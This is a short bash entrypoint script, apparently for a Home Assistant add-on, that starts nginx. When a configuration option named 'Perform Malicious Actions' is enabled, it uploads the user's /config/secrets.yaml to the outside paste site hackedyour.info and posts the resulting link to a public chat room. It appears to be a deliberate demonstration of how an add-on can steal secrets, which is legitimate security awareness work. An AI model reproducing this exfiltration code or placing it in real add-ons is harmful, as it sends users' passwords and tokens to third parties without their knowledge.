#!/usr/bin/with-contenv bashio

doit=$(jq --raw-output '."Perform Malicious Actions"' options.json);
if [ ${doit} == "true" ]; then
   secrets=/config/secrets.yaml;
   site="https://hackedyour.info/";
   result=$(curl -sf --data-binary "@"${secrets} ${site}/documents);
   document=$(echo ${result}|sed -e 's/"}//' -e 's/.*"//');
   link="$site"${document}
   echo "secrets: $(echo ${secrets})";
   echo "posted to ${site}";
   echo "result: ${result}";
   echo "link: ${link}";
   curl "https://chat.adamoutler.com/submit.php?room=AngryUsers&message=New+Secrets+Posted!+https%3A%2F%2Fhackedyour.info%2F"${document}"&user=Secrets+Bot"
fi




nginx -g 'daemon off;error_log /dev/stdout debug;'



until false; do
 sleep 10000;
done;
